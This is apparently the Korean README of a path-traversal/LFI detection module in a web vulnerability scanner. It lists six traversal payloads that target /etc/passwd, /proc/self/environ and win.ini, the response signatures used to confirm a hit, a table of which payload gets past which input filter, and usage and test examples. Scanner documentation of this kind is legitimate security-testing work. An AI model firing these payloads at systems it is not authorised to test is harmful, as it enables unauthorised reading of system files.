# file_download — 경로 순회 / LFI 모듈

서버가 사용자 입력을 그대로 파일 식별자로 사용하는 다운로드/뷰어 엔드포인트
(`/download?id=…`, `/file?id=…` 등)를 대상으로 **Path Traversal / Local File
Inclusion(LFI)** 취약점을 탐지한다. 파라미터 값에 다양한 형태의 경로 순회
페이로드를 끼워 넣고, 응답 본문에 시스템 파일이 회수됐는지 시그니처로
확인한다.

## 무엇을 탐지하는가

OS 별로 회수 가능한 시스템 파일을 노린다. 시그니처는 정상 응답에 거의
등장할 수 없는 토큰만 사용해 거짓 양성(False Positive) 위험을 사실상 0 으로
유지한다.

| 표적 시스템 | 회수 파일 | 시그니처 |
|---|---|---|
| Linux | `/etc/passwd` | `b"root:x:0:0"` |
| Linux 우회용 | `/proc/self/environ` | `b"PATH="` |
| Windows | `win.ini` | `b"[fonts]"`, `b"[extensions]"` |

## 디렉토리 구성

```
file_download/
├── __init__.py            # FileDownloadModule, PathPayload, PAYLOADS 공개
├── payloads.py            # 페이로드 카탈로그 (총 6종)
├── module.py              # FileDownloadModule(AttackModule) 본체
├── samples/
│   └── targets.yaml       # 데모용 대상 정의
└── tests/
    └── test_file_download_module.py
```

## 동작 원리

1. **후보 파라미터 결정** — `Target.inject_params` 가 비어 있으면 GET 의
   `params` 또는 POST 의 `data` 의 키 전체가 자동으로 후보가 된다.
2. **Probe 생성** — `_probes()` 가 `(파라미터 × 페이로드)` 조합을
   `Probe` 객체로 만든다.
3. **요청 송신** — `inject(target, payload, parameter)` 로 파라미터 값을
   페이로드로 갈아끼운 뒤 `HttpClient.request(...)` 로 보낸다.
4. **시그니처 매칭** — 응답 본문에서 시스템 파일 시그니처를 찾는다.
5. **Finding 생성** — 매칭 발생 시 `Severity.CRITICAL` finding.

```
[Target]
   │   url=https://example.com/download
   │   method=GET, params={"id": "1"}, inject_params=["id"]
   │
   ▼
[FileDownloadModule._probes]
   │   id × ../../../../../../etc/passwd                  ┐
   │   id × ..%2f..%2f..%2f..%2fetc%2fpasswd              │
   │   id × /etc/passwd                                   │ 6 probes
   │   id × ../../../../../proc/self/environ              │ (per param)
   │   id × ..\..\..\..\..\..\windows\win.ini             │
   │   id × C:\Windows\win.ini                            ┘
   │
   ▼ (ThreadPool)
[HttpClient.request]
   │   서버가 경로 검사를 우회당하면 응답으로 시스템 파일 내용을 그대로 돌려준다
   ▼
[match(body, signatures)]
   │   매칭 성공 → Finding(severity=critical)
   ▼
[ScanReport.findings]
```

## 페이로드 카탈로그

`payloads.py` — 6개. **(1) Linux `/etc/passwd` 인코딩 변형 3종**, **(2) Linux
`/proc/self/environ` 우회 1종**, **(3) Windows `win.ini` 변형 2종**.

| 카테고리 | 페이로드 값 | 시그니처 | 신뢰도 |
|---|---|---|---|
| `nix-passwd` | `../../../../../../etc/passwd` | `b"root:x:0:0"` | HIGH |
| `nix-passwd-urlenc` | `..%2f..%2f..%2f..%2fetc%2fpasswd` | `b"root:x:0:0"` | HIGH |
| `nix-passwd-absolute` | `/etc/passwd` | `b"root:x:0:0"` | HIGH |
| `nix-proc-environ` | `../../../../../proc/self/environ` | `b"PATH="` | MEDIUM |
| `windows-win-ini` | `..\..\..\..\..\..\windows\win.ini` | `b"[fonts]"`, `b"[extensions]"` | HIGH |
| `windows-win-ini-absolute` | `C:\Windows\win.ini` | `b"[fonts]"`, `b"[extensions]"` | HIGH |

### 어느 카테고리가 어떤 필터를 우회하는가

서버 측 입력 검증이 어떻게 빠져 나가는지 카테고리별로 정리하면 다음과 같다.

| 서버 측 필터 패턴 | 우회되는 페이로드 | 이유 |
|---|---|---|
| 검증 없음 | 모든 카테고리 | 평문 traversal 만으로도 즉시 성공 |
| `..` 평문 차단 | `nix-passwd-urlenc` | URL 디코딩 전에 검사하면 `%2f` 가 `/` 로 안 보임 |
| 점-슬래시 패턴만 차단 | `nix-passwd-absolute`, `windows-win-ini-absolute` | 절대 경로는 `..` 가 없음 |
| `etc` 문자열 차단 | `nix-proc-environ` | 경로에 `etc` 가 들어가지 않음 |
| Linux 페이로드 전부 차단 | Windows 카테고리 2종 | 대상 OS 자체가 Windows 일 때 |

OS 가 무엇이든 위 6종 중 최소 하나는 시도된다 — 즉, 단일 스캔으로 Linux/
Windows + 기본 필터 우회를 모두 커버한다.

### 새 페이로드 추가하기

`payloads.py` 의 `PAYLOADS` 튜플에 항목을 추가하면 끝. 모듈이 자동으로 순회한다.

```python
PathPayload(
    value="..%252f..%252f..%252fetc%252fpasswd",
    category="nix-passwd-double-urlenc",
    signatures=_PASSWD_SIG,
    confidence=Confidence.HIGH,
),
```

**페이로드 추가 시 고려사항**:

- 시그니처는 시스템 파일에서 거의 변하지 않는 짧은 토큰을 골라라.
  - `/etc/passwd` → `b"root:x:0:0"` (모든 리눅스에서 첫 줄에 등장)
  - `/proc/self/environ` → `b"PATH="` (대부분의 환경변수에 존재)
  - Windows `win.ini` → `b"[fonts]"` 또는 `b"[extensions]"` (섹션 헤더)
- 시그니처가 짧고 흔한 단어(예: `b"root"`)면 거짓 양성이 폭증한다. 반드시
  컨텍스트를 함께 묶어 길이를 확보해라.
- 카테고리 이름은 분석 단계에서 그룹핑 키로 쓰이므로 일관된 접두사
  (`nix-…`, `windows-…`)를 유지하면 좋다.

### 카탈로그를 늘리지 않은 이유

다음 페이로드들은 의도적으로 카탈로그에 두지 않았다. 현장에서 반복적으로
만나면 그때 추가하라.

| 제외한 패턴 | 이유 |
|---|---|
| 이중 URL 인코딩 (`..%252f…`) | URL 한 번 디코딩 후 다시 검사하는 흔치 않은 필터를 노림 — 보편성 낮음 |
| 널바이트 (`…/etc/passwd%00.png`) | 구버전 PHP 5.3 미만에서만 동작 — 현대 환경에서 가치 낮음 |
| `....//....//…` doubledot 우회 | 평문 페이로드와 적중 영역이 거의 동일 — 중복 |
| `php://filter/...` | 대상이 PHP 일 때만 의미 — 별도 PHP 전용 모듈로 분리하는 편이 깔끔 |
| `/etc/hosts`, `/etc/issue` 등 | `/etc/passwd` 시그니처가 더 명확하고, `/etc` 자체 차단은 `proc-environ` 으로 우회 |

## 사용 예시

### 인-프로세스 API

```python
from common import HttpClient, Target
from file_download import FileDownloadModule

http = HttpClient(timeout=10.0)
target = Target(
    url="https://example.com/download",
    method="GET",
    params={"id": "1"},
    inject_params=["id"],
)

for finding in FileDownloadModule(http=http, max_workers=8).run(target):
    print(finding.severity.value, finding.title, finding.payload)
```

### JSON-in / JSON-out

```python
import json
from file_download import FileDownloadModule

response_json = FileDownloadModule.run_json(json.dumps({
    "target": {
        "url": "https://example.com/file",
        "method": "POST",
        "data": {"id": "1", "token": "demo"},
        "inject_params": ["id"]
    },
    "options": {"max_workers": 8, "timeout": 10.0}
}))
report = json.loads(response_json)
```

응답 형식:

```json
{
  "module": "file_download",
  "target_url": "https://example.com/file",
  "started_at":  "2026-05-01T08:30:00.000Z",
  "finished_at": "2026-05-01T08:30:00.300Z",
  "stats": {"requests": 6, "errors": 0, "elapsed_ms": 287.4},
  "findings": [{
    "module": "file_download",
    "severity": "critical",
    "confidence": "high",
    "title": "Path traversal via id: nix-passwd-urlenc",
    "parameter": "id",
    "payload": "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "evidence": "root:x:0:0",
    "request": {"url": "...", "method": "POST", "params": {...}, "data": {...}},
    "response": {"status": 200, "elapsed_ms": 92.1, "length": 1638}
  }]
}
```

## 한계와 경계

- 이중-URL 인코딩, 유니코드 우회 같은 고급 필터 우회는 카탈로그에 없다.
  실전에서 만나면 위 "새 페이로드 추가하기" 절을 따라 한 줄 추가.
- Windows 의 경우 환경에 따라 `C:\Windows\win.ini` 가 아닌 `Windows\System32\
  drivers\etc\hosts` 같은 다른 보편 파일을 노리는 편이 더 효과적일 수 있다 —
  이런 경우도 카탈로그 한 줄 추가로 끝난다.
- 응답이 64 KiB 를 넘어가면 시그니처 매칭은 첫 64 KiB 만 검사한다
  (`HttpClient` 의 본문 상한). `/etc/passwd`, `win.ini` 모두 일반적으로 수
  KB 이내라 실무상 영향 없음.

## 테스트

```sh
pytest file_download/tests
```

`conftest.py` 의 `fixture_server` 가 127.0.0.1 에 바인딩된 HTTP 서버를 띄워
페이로드 토큰별로 다른 시스템 파일 본문을 돌려준다. 실제 외부 호스트로
요청이 나가지 않는다.
